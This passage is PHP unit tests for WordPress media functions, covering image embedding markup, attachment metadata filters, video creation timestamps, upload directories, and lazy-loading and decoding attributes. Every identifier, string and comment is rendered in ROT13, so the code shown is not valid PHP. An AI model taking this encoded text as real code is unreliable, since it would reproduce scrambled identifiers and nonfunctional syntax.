	choyvp shapgvba grfg_trg_vzntr_fraq_gb_rqvgbe_qrsnhygf_jvgu_bcgvbany_cnenzf() {
		$vq      = frys::$ynetr_vq;
		$pncgvba = 'N grfg pncgvba.';
		$gvgyr   = 'N grfg gvgyr inyhr.';
		$nyvta   = 'yrsg';
		$hey     = trg_creznyvax( $vq );
		$ery     = gehr;
		$fvmr    = 'guhzoanvy';
		$nyg     = 'Na rknzcyr nyg inyhr.';

		// Pnyphyngr nggnpuzrag qngn.
		$nggnpuzrag = jc_trg_nggnpuzrag_vzntr_fep( $vq, $fvmr );

		$ugzy = '<n uers=\"%1$f\" ery=\"%2$f\"><vzt fep=\"%3$f\" nyg=\"%4$f\" jvqgu=\"%5$q\" urvtug=\"%6$q\" pynff=\"fvmr-%8$f jc-vzntr-%9$q\" /></n>';
		$ugzy = '[pncgvba vq=\"nggnpuzrag_%9$q\" nyvta=\"nyvta%7$f\" jvqgu=\"%5$q\"]' . $ugzy . ' %10$f[/pncgvba]';

		$rkcrpgrq = fcevags(
			$ugzy,
			$hey,
			'nggnpuzrag jc-ngg-' . $vq,
			$nggnpuzrag[0],
			$nyg,
			$nggnpuzrag[1],
			$nggnpuzrag[2],
			$nyvta,
			$fvmr,
			$vq,
			$pncgvba
		);

		$guvf->nffregFnzr( $rkcrpgrq, trg_vzntr_fraq_gb_rqvgbe( $vq, $pncgvba, $gvgyr, $nyvta, $hey, $ery, $fvmr, $nyg ) );
	}

	/**
	 * @gvpxrg 36084
	 */
	choyvp shapgvba grfg_trg_vzntr_fraq_gb_rqvgbe_qrsnhygf_ab_pncgvba_ab_ery() {
		$vq      = frys::$ynetr_vq;
		$pncgvba = '';
		$gvgyr   = 'N grfg gvgyr inyhr.';
		$nyvta   = 'yrsg';
		$hey     = trg_creznyvax( $vq );
		$ery     = '';
		$fvmr    = 'guhzoanvy';
		$nyg     = 'Na rknzcyr nyg inyhr.';

		// Pnyphyngr nggnpuzrag qngn.
		$nggnpuzrag = jc_trg_nggnpuzrag_vzntr_fep( $vq, $fvmr );

		$ugzy = '<n uers=\"%1$f\"><vzt fep=\"%2$f\" nyg=\"%3$f\" jvqgu=\"%4$q\" urvtug=\"%5$q\" pynff=\"nyvta%6$f fvmr-%7$f jc-vzntr-%8$q\" /></n>';

		$rkcrpgrq = fcevags(
			$ugzy,
			$hey,
			$nggnpuzrag[0],
			$nyg,
			$nggnpuzrag[1],
			$nggnpuzrag[2],
			$nyvta,
			$fvmr,
			$vq
		);

		$guvf->nffregFnzr( $rkcrpgrq, trg_vzntr_fraq_gb_rqvgbe( $vq, $pncgvba, $gvgyr, $nyvta, $hey, $ery, $fvmr, $nyg ) );
	}

	/**
	 * Grfgf vs jc_trg_nggnpuzrag_vzntr() hfrf jc_trg_nggnpuzrag_zrgnqngn().
	 *
	 * Va guvf jnl, gur zrgn qngn pna or svygrerq hfvat gur svygre
	 * `jc_trg_nggnpuzrag_zrgnqngn`.
	 *
	 * Gur grfg purpxf vs gur vzntr fvmr gung vf nqqrq va gur svygre vf
	 * hfrq va gur bhgchg bs `jc_trg_nggnpuzrag_vzntr()`.
	 *
	 * @gvpxrg 36246
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_fubhyq_hfr_jc_trg_nggnpuzrag_zrgnqngn() {
		nqq_svygre( 'jc_trg_nggnpuzrag_zrgnqngn', neenl( $guvf, 'svygre_36246' ), 10, 2 );

		erzbir_nyy_svygref( 'jc_pnyphyngr_vzntr_fvmrf' );

		$onfranzr    = jc_onfranzr( frys::$ynetr_svyranzr, '.wct' );
		$lrne_zbagu  = tzqngr( 'L/z' );
		$hcybnqf_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . $lrne_zbagu . '/';

		$rkcrpgrq = '<vzt jvqgu=\"999\" urvtug=\"999\" ' .
			'fep=\"' . $hcybnqf_hey . 'grfg-vzntr-grfgfvmr-999k999.wct\" ' .
			'pynff=\"nggnpuzrag-grfgfvmr fvmr-grfgfvmr\" nyg=\"\" qrpbqvat=\"nflap\" ybnqvat=\"ynml\" ' .
			'fepfrg=\"' . $hcybnqf_hey . 'grfg-vzntr-grfgfvmr-999k999.wct 999j, ' . $hcybnqf_hey . $onfranzr . '-150k150.wct 150j\" ' .
			'fvmrf=\"nhgb, (znk-jvqgu: 999ck) 100ij, 999ck\" />';

		$npghny = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'grfgfvmr' );

		erzbir_svygre( 'jc_trg_nggnpuzrag_zrgnqngn', neenl( $guvf, 'svygre_36246' ) );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	choyvp shapgvba svygre_36246( $qngn, $nggnpuzrag_vq ) {
		$qngn['fvmrf']['grfgfvmr'] = neenl(
			'svyr'      => 'grfg-vzntr-grfgfvmr-999k999.wct',
			'jvqgu'     => 999,
			'urvtug'    => 999,
			'zvzr-glcr' => 'vzntr/wct',
		);
		erghea $qngn;
	}

	/**
	 * @gvpxrg 50679
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_zrgnqngn_fubhyq_erghea_snyfr_vs_ab_nggnpuzrag() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$qngn    = jc_trg_nggnpuzrag_zrgnqngn( $cbfg_vq );
		$guvf->nffregSnyfr( $qngn );
	}

	/**
	 * @gvpxrg 37813
	 */
	choyvp shapgvba grfg_erghea_glcr_jura_vafregvat_nggnpuzrag_jvgu_reebe_va_qngn() {
		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'Nggnpuzrag pbagrag',
			'cbfg_gvgyr'   => 'Nggnpuzrag Gvgyr',
			'cbfg_qngr'    => '2012-02-30 00:00:00',
		);

		$nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $qngn, '', 0, gehr );
		$guvf->nffregJCReebe( $nggnpuzrag_vq );
		$guvf->nffregFnzr( 'vainyvq_qngr', $nggnpuzrag_vq->trg_reebe_pbqr() );

		$nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $qngn, '', 0 );
		$guvf->nffregFnzr( 0, $nggnpuzrag_vq );
	}

	/**
	 * @gvpxrg 35218
	 */
	choyvp shapgvba grfg_jc_trg_zrqvn_perngvba_gvzrfgnzc_ivqrb_nfs() {
		$zrgnqngn = neenl(
			'svyrsbezng' => 'nfs',
			'nfs'        => neenl(
				'svyr_cebcregvrf_bowrpg' => neenl(
					'perngvba_qngr_havk' => 123,
				),
			),
		);

		$guvf->nffregFnzr( 123, jc_trg_zrqvn_perngvba_gvzrfgnzc( $zrgnqngn ) );
	}

	/**
	 * @gvpxrg 35218
	 */
	choyvp shapgvba grfg_jc_trg_zrqvn_perngvba_gvzrfgnzc_ivqrb_zngebfxn() {
		$zrgnqngn = neenl(
			'svyrsbezng' => 'zngebfxn',
			'zngebfxn'   => neenl(
				'pbzzragf' => neenl(
					'perngvba_gvzr' => neenl(
						'2015-12-24G17:40:09M',
					),
				),
			),
		);

		$guvf->nffregFnzr( 1450978809, jc_trg_zrqvn_perngvba_gvzrfgnzc( $zrgnqngn ) );
	}

	/**
	 * @gvpxrg 35218
	 */
	choyvp shapgvba grfg_jc_trg_zrqvn_perngvba_gvzrfgnzc_ivqrb_dhvpxgvzr() {
		$zrgnqngn = neenl(
			'svyrsbezng' => 'dhvpxgvzr',
			'dhvpxgvzr'  => neenl(
				'zbbi' => neenl(
					'fhongbzf' => neenl(
						neenl(
							'perngvba_gvzr_havk' => 1450978805,
						),
					),
				),
			),
		);

		$guvf->nffregFnzr( 1450978805, jc_trg_zrqvn_perngvba_gvzrfgnzc( $zrgnqngn ) );
	}

	/**
	 * @gvpxrg 35218
	 */
	choyvp shapgvba grfg_jc_trg_zrqvn_perngvba_gvzrfgnzc_ivqrb_jroz() {
		$zrgnqngn = neenl(
			'svyrsbezng' => 'jroz',
			'zngebfxn'   => neenl(
				'vasb' => neenl(
					neenl(
						'QngrHGP_havk' => 1265680539,
					),
				),
			),
		);

		$guvf->nffregFnzr( 1265680539, jc_trg_zrqvn_perngvba_gvzrfgnzc( $zrgnqngn ) );
	}

	/**
	 * Grfg perngrq gvzrfgnzc vf cebcreyl ernq sebz na ZC4 svyr.
	 *
	 * Guvf ZC4 ivqrb svyr unf na NNP nhqvb genpx, fb vg pna or hfrq gb grfg
	 *`jc_ernq_nhqvb_zrgnqngn()`.
	 *
	 * @gvpxrg 42017
	 */
	choyvp shapgvba grfg_jc_ernq_nhqvb_zrgnqngn_nqqf_perngvba_qngr_jvgu_zc4() {
		$ivqrb    = QVE_GRFGQNGN . '/hcybnqf/fznyy-ivqrb.zc4';
		$zrgnqngn = jc_ernq_nhqvb_zrgnqngn( $ivqrb );

		$guvf->nffregFnzr( 1269120551, $zrgnqngn['perngrq_gvzrfgnzc'] );
	}

	/**
	 * @gvpxrg 35218
	 */
	choyvp shapgvba grfg_jc_ernq_ivqrb_zrgnqngn_nqqf_perngvba_qngr_jvgu_dhvpxgvzr() {
		$ivqrb    = QVE_GRFGQNGN . '/hcybnqf/fznyy-ivqrb.zbi';
		$zrgnqngn = jc_ernq_ivqrb_zrgnqngn( $ivqrb );

		$guvf->nffregFnzr( 1269120551, $zrgnqngn['perngrq_gvzrfgnzc'] );
	}

	/**
	 * @gvpxrg 35218
	 */
	choyvp shapgvba grfg_jc_ernq_ivqrb_zrgnqngn_nqqf_perngvba_qngr_jvgu_zc4() {
		$ivqrb    = QVE_GRFGQNGN . '/hcybnqf/fznyy-ivqrb.zc4';
		$zrgnqngn = jc_ernq_ivqrb_zrgnqngn( $ivqrb );

		$guvf->nffregFnzr( 1269120551, $zrgnqngn['perngrq_gvzrfgnzc'] );
	}

	/**
	 * @gvpxrg 35218
	 */
	choyvp shapgvba grfg_jc_ernq_ivqrb_zrgnqngn_nqqf_perngvba_qngr_jvgu_zxi() {
		$ivqrb    = QVE_GRFGQNGN . '/hcybnqf/fznyy-ivqrb.zxi';
		$zrgnqngn = jc_ernq_ivqrb_zrgnqngn( $ivqrb );

		$guvf->nffregFnzr( 1269120551, $zrgnqngn['perngrq_gvzrfgnzc'] );
	}

	/**
	 * @gvpxrg 35218
	 */
	choyvp shapgvba grfg_jc_ernq_ivqrb_zrgnqngn_nqqf_perngvba_qngr_jvgu_jroz() {
		$ivqrb    = QVE_GRFGQNGN . '/hcybnqf/fznyy-ivqrb.jroz';
		$zrgnqngn = jc_ernq_ivqrb_zrgnqngn( $ivqrb );

		$guvf->nffregFnzr( 1269120551, $zrgnqngn['perngrq_gvzrfgnzc'] );
	}

	/**
	 * @gvpxrg 10752
	 */
	choyvp shapgvba grfg_zrqvn_unaqyr_hcybnq_hfrf_cbfg_cnerag_sbe_qverpgbel_qngr() {
		$vcgp_svyr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr-vcgp.wct';

		// Znxr n pbcl bs guvf svyr nf vg trgf zbirq qhevat gur svyr hcybnq.
		$gzc_anzr = jc_grzcanz( $vcgp_svyr );

		pbcl( $vcgp_svyr, $gzc_anzr );

		$_SVYRF['hcybnq'] = neenl(
			'gzc_anzr' => $gzc_anzr,
			'anzr'     => 'grfg-vzntr-vcgp.wct',
			'glcr'     => 'vzntr/wcrt',
			'reebe'    => 0,
			'fvmr'     => svyrfvmr( $vcgp_svyr ),
		);

		$cnerag_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2010-01-01' ) );

		$cbfg_vq = zrqvn_unaqyr_hcybnq(
			'hcybnq',
			$cnerag_vq,
			neenl(),
			neenl(
				'npgvba'    => 'grfg_vcgp_hcybnq',
				'grfg_sbez' => snyfr,
			)
		);

		hafrg( $_SVYRF['hcybnq'] );

		$hey = jc_trg_nggnpuzrag_hey( $cbfg_vq );

		$hcybnqf_qve = jc_hcybnq_qve( '2010/01' );

		$rkcrpgrq = $hcybnqf_qve['hey'] . '/grfg-vzntr-vcgp.wct';

		// Pyrna hc.
		jc_qryrgr_nggnpuzrag( $cbfg_vq, gehr );
		jc_qryrgr_cbfg( $cnerag_vq, gehr );

		$guvf->nffregFnzr( $rkcrpgrq, $hey );
	}

	/**
	 * @gvpxrg 10752
	 */
	choyvp shapgvba grfg_zrqvn_unaqyr_hcybnq_vtaberf_cntr_cnerag_sbe_qverpgbel_qngr() {
		$vcgp_svyr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr-vcgp.wct';

		// Znxr n pbcl bs guvf svyr nf vg trgf zbirq qhevat gur svyr hcybnq.
		$gzc_anzr = jc_grzcanz( $vcgp_svyr );

		pbcl( $vcgp_svyr, $gzc_anzr );

		$_SVYRF['hcybnq'] = neenl(
			'gzc_anzr' => $gzc_anzr,
			'anzr'     => 'grfg-vzntr-vcgp.wct',
			'glcr'     => 'vzntr/wcrt',
			'reebe'    => 0,
			'fvmr'     => svyrfvmr( $vcgp_svyr ),
		);

		$cnerag_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr' => '2010-01-01',
				'cbfg_glcr' => 'cntr',
			)
		);
		$cnerag    = trg_cbfg( $cnerag_vq );

		$cbfg_vq = zrqvn_unaqyr_hcybnq(
			'hcybnq',
			$cnerag_vq,
			neenl(),
			neenl(
				'npgvba'    => 'grfg_vcgp_hcybnq',
				'grfg_sbez' => snyfr,
			)
		);

		hafrg( $_SVYRF['hcybnq'] );

		$hey = jc_trg_nggnpuzrag_hey( $cbfg_vq );

		$hcybnqf_qve = jc_hcybnq_qve( pheerag_gvzr( 'zlfdy' ) );

		$rkcrpgrq = $hcybnqf_qve['hey'] . '/grfg-vzntr-vcgp.wct';

		// Pyrna hc.
		jc_qryrgr_nggnpuzrag( $cbfg_vq, gehr );
		jc_qryrgr_cbfg( $cnerag_vq, gehr );

		$guvf->nffregFnzr( $rkcrpgrq, $hey );
	}

	/**
	 * @gvpxrg 50367
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_jvqgu_urvtug() {
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$fvmr_neenl = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, 'zrqvhz' );

		$vzt                 = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$vzt_ab_jvqgu_urvtug = fge_ercynpr( ' jvqgu=\"' . $fvmr_neenl[0] . '\"', '', $vzt );
		$vzt_ab_jvqgu_urvtug = fge_ercynpr( ' urvtug=\"' . $fvmr_neenl[1] . '\"', '', $vzt_ab_jvqgu_urvtug );
		$vzt_ab_jvqgu        = fge_ercynpr( ' jvqgu=\"' . $fvmr_neenl[0] . '\"', '', $vzt );
		$vzt_ab_urvtug       = fge_ercynpr( ' urvtug=\"' . $fvmr_neenl[1] . '\"', '', $vzt );

		$ujfgevat = vzntr_ujfgevat( $fvmr_neenl[0], $fvmr_neenl[1] );

		// Znahnyyl nqq jvqgu naq urvtug gb gur znexhc sebz trg_vzntr_gnt().
		$erfcvzt_ab_jvqgu_urvtug = fge_ercynpr( '<vzt ', '<vzt ' . $ujfgevat, $vzt_ab_jvqgu_urvtug );

		$pbagrag = '
			<c>Vzntr, jvgu jvqgu naq urvtug. Fubhyq ABG or zbqvsvrq.</c>
			%1$f

			<c>Vzntr, ab jvqgu naq urvtug nggevohgrf. Fubhyq unir jvqgu, urvtug, fepfrg naq fvmrf (sebz zngpuvat gur svyr anzr).</c>
			%2$f

			<c>Vzntr, ab jvqgu ohg urvtug nggevohgr. Fubhyq ABG or zbqvsvrq.</c>
			%3$f

			<c>Vzntr, ab urvtug ohg jvqgu nggevohgr. Fubhyq ABG or zbqvsvrq.</c>
			%4$f';

		$pbagrag_hasvygrerq = fcevags(
			$pbagrag,
			$vzt,
			$vzt_ab_jvqgu_urvtug,
			$vzt_ab_jvqgu,
			$vzt_ab_urvtug
		);

		$pbagrag_svygrerq = fcevags(
			$pbagrag,
			$vzt,
			$erfcvzt_ab_jvqgu_urvtug,
			$vzt_ab_jvqgu,
			$vzt_ab_urvtug
		);

		// Qb abg nqq ybnqvat, fepfrg, naq fvmrf.
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );

		$guvf->nffregFnzr( $pbagrag_svygrerq, jc_svygre_pbagrag_gntf( $pbagrag_hasvygrerq ) );

		erzbir_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50367
	 * @gvpxrg 50756
	 * @gvpxrg 58235
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_ybnqvat_ynml() {
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$fvmr_neenl = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, 'zrqvhz' );

		$vzt                    = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$vzt_kugzy              = fge_ercynpr( ' />', '/>', $vzt );
		$vzt_ugzy5              = fge_ercynpr( ' />', '>', $vzt );
		$vzt_ab_jvqgu_urvtug    = fge_ercynpr( ' jvqgu=\"' . $fvmr_neenl[0] . '\"', '', $vzt );
		$vzt_ab_jvqgu_urvtug    = fge_ercynpr( ' urvtug=\"' . $fvmr_neenl[1] . '\"', '', $vzt_ab_jvqgu_urvtug );
		$vsenzr                 = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		$vsenzr_ab_jvqgu_urvtug = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\"></vsenzr>';

		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );

		$ynml_vzt       = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt, 'grfg' );
		$ynml_vzt_kugzy = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt_kugzy, 'grfg' );
		$ynml_vzt_ugzy5 = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt_ugzy5, 'grfg' );
		$ynml_vsenzr    = jc_vsenzr_gnt_nqq_ybnqvat_ngge( $vsenzr, 'grfg' );

		// Gur sbyybjvat fubhyq abg or zbqvsvrq orpnhfr gurer nyernql vf n 'ybnqvat' nggevohgr.
		$vzt_rntre    = fge_ercynpr( ' />', ' ybnqvat=\"rntre\" srgpucevbevgl=\"uvtu\" />', $vzt );
		$vsenzr_rntre = fge_ercynpr( '\">', '\" ybnqvat=\"rntre\">', $vsenzr );

		$pbagrag = '
			<c>Vzntr, fgnaqneq.</c>
			%1$f
			<c>Vzntr, KUGZY 1.0 fglyr (ab fcnpr orsber gur pybfvat fynfu).</c>
			%2$f
			<c>Vzntr, UGZY 5.0 fglyr.</c>
			%3$f
			<c>Vzntr, jvgu cer-rkvfgvat \"ybnqvat\" nggevohgr. Fubhyq abg or zbqvsvrq.</c>
			%4$f
			<c>Vzntr, jvgubhg qvzrafvba nggevohgrf. Fubhyq abg or zbqvsvrq.</c>
			%5$f
			<c>Vsenzr, fgnaqneq.</c>
			%6$f
			<c>Vsenzr, jvgu cer-rkvfgvat \"ybnqvat\" nggevohgr. Fubhyq abg or zbqvsvrq.</c>
			%7$f
			<c>Vsenzr, jvgubhg qvzrafvba nggevohgrf. Fubhyq abg or zbqvsvrq.</c>
			%8$f';

		$pbagrag_hasvygrerq = fcevags(
			$pbagrag,
			$vzt,
			$vzt_kugzy,
			$vzt_ugzy5,
			$vzt_rntre,
			$vzt_ab_jvqgu_urvtug,
			$vsenzr,
			$vsenzr_rntre,
			$vsenzr_ab_jvqgu_urvtug
		);

		$pbagrag_svygrerq = fcevags(
			$pbagrag,
			$ynml_vzt,
			$ynml_vzt_kugzy,
			$ynml_vzt_ugzy5,
			$vzt_rntre,
			$vzt_ab_jvqgu_urvtug,
			$ynml_vsenzr,
			$vsenzr_rntre,
			$vsenzr_ab_jvqgu_urvtug
		);

		// Qb abg nqq jvqgu, urvtug, fepfrg, naq fvmrf.
		nqq_svygre( 'jc_vzt_gnt_nqq_jvqgu_naq_urvtug_ngge', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );

		$guvf->nffregFnzr( $pbagrag_svygrerq, jc_svygre_pbagrag_gntf( $pbagrag_hasvygrerq ) );

		erzbir_svygre( 'jc_vzt_gnt_nqq_jvqgu_naq_urvtug_ngge', '__erghea_snyfr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50756
	 * @gvpxrg 58235
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_ybnqvat_ynml_bcgrq_va() {
		$vzt         = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$ynml_vzt    = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt, 'grfg' );
		$vsenzr      = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		$ynml_vsenzr = jc_vsenzr_gnt_nqq_ybnqvat_ngge( $vsenzr, 'grfg' );

		$pbagrag = '
			<c>Vzntr, fgnaqneq.</c>
			%1$f
			<c>Vsenzr, fgnaqneq.</c>
			%2$f';

		$pbagrag_hasvygrerq = fcevags( $pbagrag, $vzt, $vsenzr );
		$pbagrag_svygrerq   = fcevags( $pbagrag, $ynml_vzt, $ynml_vsenzr );

		// Qb abg nqq fepfrg naq fvmrf juvyr grfgvat.
		nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );

		// Ranoyr tybonyyl sbe nyy gntf.
		nqq_svygre( 'jc_ynml_ybnqvat_ranoyrq', '__erghea_gehr' );

		$guvf->nffregFnzr( $pbagrag_svygrerq, jc_svygre_pbagrag_gntf( $pbagrag_hasvygrerq ) );
		erzbir_svygre( 'jc_ynml_ybnqvat_ranoyrq', '__erghea_gehr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50756
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_ybnqvat_ynml_bcgrq_bhg() {
		$vzt    = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$vsenzr = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';

		$pbagrag = '
			<c>Vzntr, fgnaqneq.</c>
			%1$f
			<c>Vsenzr, fgnaqneq.</c>
			%2$f';
		$pbagrag = fcevags( $pbagrag, $vzt, $vsenzr );

		// Qb abg nqq fepfrg naq fvmrf juvyr grfgvat.
		nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );

		// Qvfnoyr tybonyyl sbe nyy gntf.
		nqq_svygre( 'jc_ynml_ybnqvat_ranoyrq', '__erghea_snyfr' );
		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );

		$guvf->nffregFnzr( $pbagrag, jc_svygre_pbagrag_gntf( $pbagrag ) );
		erzbir_svygre( 'jc_ynml_ybnqvat_ranoyrq', '__erghea_snyfr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		erzbir_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50367
	 *
	 * @rkcrpgrqQrcerpngrq jc_vzt_gnt_nqq_ybnqvat_ngge
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_ybnqvat_ngge() {
		$vzt = '<vzt fep=\"rknzcyr.cat\" nyg=\" jvqgu=\"300\" urvtug=\"225\" />';
		$vzt = jc_vzt_gnt_nqq_ybnqvat_ngge( $vzt, 'grfg' );

		$guvf->nffregFgevatPbagnvafFgevat( ' ybnqvat=\"ynml\"', $vzt );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50367
	 *
	 * @rkcrpgrqQrcerpngrq jc_vzt_gnt_nqq_ybnqvat_ngge
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_ybnqvat_ngge_jvgubhg_fep() {
		$vzt = '<vzt nyg=\" jvqgu=\"300\" urvtug=\"225\" />';
		$vzt = jc_vzt_gnt_nqq_ybnqvat_ngge( $vzt, 'grfg' );

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vzt );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50367
	 *
	 * @rkcrpgrqQrcerpngrq jc_vzt_gnt_nqq_ybnqvat_ngge
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_ybnqvat_ngge_jvgu_fvatyr_dhbgrf() {
		$vzt = \"<vzt fep='rknzcyr.cat' nyg=' jvqgu='300' urvtug='225' />\";
		$vzt = jc_vzt_gnt_nqq_ybnqvat_ngge( $vzt, 'grfg' );

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vzt );

		// Grfg fcrpvsvpnyyl gung gur nggevohgr vf abg gurer jvgu qbhoyr-dhbgrf,
		// gb nibvq erterffvbaf.
		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=\"ynml\"', $vzt );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50425
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_ybnqvat_ngge_bcg_bhg() {
		$vzt = '<vzt fep=\"rknzcyr.cat\" nyg=\" jvqgu=\"300\" urvtug=\"225\" />';
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vzt );
	}

	/**
	 * Grfg gung qrpbqvat=\"nflap\" vf abg nccyvrq gb vzt gntf jvgu fvatyr dhbgrf.
	 *
	 * @gvpxrg 56969
	 *
	 * @rkcrpgrqQrcerpngrq jc_vzt_gnt_nqq_qrpbqvat_ngge
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_qrpbqvat_ngge_jvgu_fvatyr_dhbgrf() {
		$vzt = \"<vzt fep='rknzcyr.cat' nyg='' jvqgu='300' urvtug='225' />\";
		$vzt = jc_vzt_gnt_nqq_qrpbqvat_ngge( $vzt, 'grfg' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( ' qrpbqvat=\"nflap\"', $vzt );
	}

	/**
	 * Grfg gung qrpbqvat=\"nflap\" vf abg nccyvrq gb vzt gntf vafvqr WFBA.
	 *
	 * @gvpxrg 56969
	 */
	choyvp shapgvba grfg_qrpbqvat_nflap_abg_nccyvrq_gb_wfba() {
		$pbagrag = '{\"vzntr\": \"<vzt fep=\\"rknzcyr.cat\\" nyg=\\"\\" jvqgu=\\"300\\" urvtug=\\"225\\" />\"}';
		$pbagrag = jc_svygre_pbagrag_gntf( $pbagrag );
		$guvf->nffregFgevatAbgPbagnvafFgevat( ' qrpbqvat=\"nflap\"', $pbagrag );
	}

	/**
	 * @gvpxrg 50756
	 */
	choyvp shapgvba grfg_jc_vsenzr_gnt_nqq_ybnqvat_ngge() {
		$vsenzr = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		$vsenzr = jc_vsenzr_gnt_nqq_ybnqvat_ngge( $vsenzr, 'grfg' );

		$guvf->nffregFgevatPbagnvafFgevat( ' ybnqvat=\"ynml\"', $vsenzr );
	}

	/**
	 * @gvpxrg 50756
	 */
	choyvp shapgvba grfg_jc_vsenzr_gnt_nqq_ybnqvat_ngge_jvgubhg_fep() {
		$vsenzr = '<vsenzr jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		$vsenzr = jc_vsenzr_gnt_nqq_ybnqvat_ngge( $vsenzr, 'grfg' );

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vsenzr );
	}

	/**
	 * @gvpxrg 50756
	 */
	choyvp shapgvba grfg_jc_vsenzr_gnt_nqq_ybnqvat_ngge_jvgu_fvatyr_dhbgrf() {
		$vsenzr = \"<vsenzr fep='uggcf://jjj.rknzcyr.pbz' jvqgu='640' urvtug='360'></vsenzr>\";
		$vsenzr = jc_vsenzr_gnt_nqq_ybnqvat_ngge( $vsenzr, 'grfg' );

